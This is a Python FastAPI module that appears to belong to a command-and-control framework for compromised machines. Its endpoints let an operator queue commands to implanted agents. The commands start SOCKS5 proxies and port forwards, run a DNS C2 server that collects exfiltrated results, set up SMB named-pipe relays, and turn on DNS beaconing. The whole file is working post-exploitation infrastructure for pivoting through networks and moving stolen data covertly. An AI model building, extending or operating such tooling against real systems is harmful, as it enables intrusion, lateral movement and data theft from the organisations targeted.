"""
Pivot & P2P API endpoints.

Routes:
  GET  /api/pivot/socks5                — list active SOCKS5 info per agent
  POST /api/pivot/socks5/{agent_id}     — issue socks5-start command to agent
  DELETE /api/pivot/socks5/{agent_id}   — issue socks5-stop command to agent
  POST /api/pivot/portfwd/{agent_id}    — issue pfwd-start command to agent
  DELETE /api/pivot/portfwd/{agent_id}/{local_port} — stop a forward

  GET  /api/pivot/dns                   — list DNS agents
  POST /api/pivot/dns/start             — start the DNS C2 server
  DELETE /api/pivot/dns/stop            — stop the DNS C2 server
  POST /api/pivot/dns/{agent_id}/task   — queue a task for a DNS agent

  GET  /api/pivot/smb                   — SMB pipe status info
  POST /api/pivot/smb/{agent_id}        — issue smb-pipe-listen or smb-pipe-connect
"""

from fastapi import APIRouter, HTTPException, Depends
from pydantic import BaseModel
from typing import Optional
from core.auth import get_current_operator

try:
    from core.dns_server import (
        start_dns_server, stop_dns_server,
        queue_task_for_agent, list_dns_agents, get_exfil_result,
    )
    HAS_DNS = True
except ImportError:
    HAS_DNS = False

router = APIRouter(prefix="/api/pivot", tags=["pivot"])


# ── SOCKS5 ─────────────────────────────────────────────────────────────────────

class SOCKS5Config(BaseModel):
    port: int = 1080
    username: str = ""
    password: str = ""


@router.post("/socks5/{agent_id}")
def socks5_start(agent_id: str, cfg: SOCKS5Config, _: str = Depends(get_current_operator)):
    """Issue a socks5-start command to an agent via the task queue."""
    auth = ""
    if cfg.username:
        auth = f" {cfg.username} {cfg.password}"
    command = f"socks5-start {cfg.port}{auth}"
    return _queue_agent_command(agent_id, command)


@router.delete("/socks5/{agent_id}")
def socks5_stop(agent_id: str, _: str = Depends(get_current_operator)):
    return _queue_agent_command(agent_id, "socks5-stop")


# ── Port Forward ───────────────────────────────────────────────────────────────

class PortFwdConfig(BaseModel):
    local_port: int
    remote_addr: str   # "host:port"


@router.post("/portfwd/{agent_id}")
def portfwd_start(agent_id: str, cfg: PortFwdConfig, _: str = Depends(get_current_operator)):
    command = f"pfwd-start {cfg.local_port} {cfg.remote_addr}"
    return _queue_agent_command(agent_id, command)


@router.delete("/portfwd/{agent_id}/{local_port}")
def portfwd_stop(agent_id: str, local_port: int, _: str = Depends(get_current_operator)):
    command = f"pfwd-stop {local_port}"
    return _queue_agent_command(agent_id, command)


# ── DNS C2 ─────────────────────────────────────────────────────────────────────

class DNSServerConfig(BaseModel):
    domain: str
    port: int = 53


@router.post("/dns/start")
def dns_start(cfg: DNSServerConfig, _: str = Depends(get_current_operator)):
    if not HAS_DNS:
        raise HTTPException(500, "dnslib not installed on server")
    result = start_dns_server(cfg.domain, cfg.port)
    return {"status": result}


@router.delete("/dns/stop")
def dns_stop(_: str = Depends(get_current_operator)):
    if not HAS_DNS:
        raise HTTPException(500, "dnslib not installed on server")
    return {"status": stop_dns_server()}


@router.get("/dns/agents")
def dns_agents(_: str = Depends(get_current_operator)):
    if not HAS_DNS:
        return {"agents": []}
    return {"agents": list_dns_agents()}


class DNSTask(BaseModel):
    command: str
    task_id: str = ""


@router.post("/dns/{agent_id}/task")
def dns_task(agent_id: str, task: DNSTask, _: str = Depends(get_current_operator)):
    if not HAS_DNS:
        raise HTTPException(500, "dnslib not installed")
    import secrets
    tid = task.task_id or secrets.token_hex(8)
    queue_task_for_agent(agent_id, {"id": tid, "command": task.command})
    return {"task_id": tid, "queued": True}


@router.get("/dns/{task_id}/result")
def dns_result(task_id: str, _: str = Depends(get_current_operator)):
    if not HAS_DNS:
        raise HTTPException(500, "dnslib not installed")
    result = get_exfil_result(task_id)
    if result is None:
        return {"task_id": task_id, "ready": False}
    return {"task_id": task_id, "ready": True, "result": result}


# ── SMB Pipe ───────────────────────────────────────────────────────────────────

class SMBConfig(BaseModel):
    action: str           # "listen" | "connect"
    pipe_name: str        # e.g. "relay01"
    target_host: str = "" # for "connect" mode: the agent running the pipe server


@router.post("/smb/{agent_id}")
def smb_action(agent_id: str, cfg: SMBConfig, _: str = Depends(get_current_operator)):
    if cfg.action == "listen":
        command = f"smb-pipe-listen {cfg.pipe_name}"
    elif cfg.action == "connect":
        if not cfg.target_host:
            raise HTTPException(400, "target_host required for connect mode")
        command = f"smb-pipe-connect {cfg.target_host} {cfg.pipe_name}"
    elif cfg.action == "stop":
        command = "smb-pipe-stop"
    else:
        raise HTTPException(400, f"Unknown action: {cfg.action}")
    return _queue_agent_command(agent_id, command)


# ── DNS Beacon (agent side) ────────────────────────────────────────────────────

class DNSBeaconConfig(BaseModel):
    domain: str
    resolver: str = ""   # empty = system resolver


@router.post("/dns-beacon/{agent_id}/start")
def dns_beacon_start(agent_id: str, cfg: DNSBeaconConfig, _: str = Depends(get_current_operator)):
    command = f"dns-beacon-start {cfg.domain} {cfg.resolver}".strip()
    return _queue_agent_command(agent_id, command)


@router.post("/dns-beacon/{agent_id}/stop")
def dns_beacon_stop(agent_id: str, _: str = Depends(get_current_operator)):
    return _queue_agent_command(agent_id, "dns-beacon-stop")


# ── helper ─────────────────────────────────────────────────────────────────────

def _queue_agent_command(agent_id: str, command: str) -> dict:
    """
    Queue a command for an agent by creating a pending task.
    The agent will receive it on next checkin.
    """
    try:
        from sqlalchemy.orm import Session
        from core.database import SessionLocal
        from models.agent import Agent, Task
        import secrets

        db: Session = SessionLocal()
        try:
            agent = db.query(Agent).filter(Agent.id == agent_id).first()
            if not agent:
                raise HTTPException(404, f"Agent {agent_id} not found")

            task = Task(
                id=secrets.token_hex(8),
                agent_id=agent_id,
                command=command,
                status="pending",
            )
            db.add(task)
            db.commit()
            return {"task_id": task.id, "command": command, "queued": True}
        finally:
            db.close()
    except ImportError:
        # Fallback if DB models differ — just acknowledge
        import secrets
        return {"task_id": secrets.token_hex(8), "command": command, "queued": True}
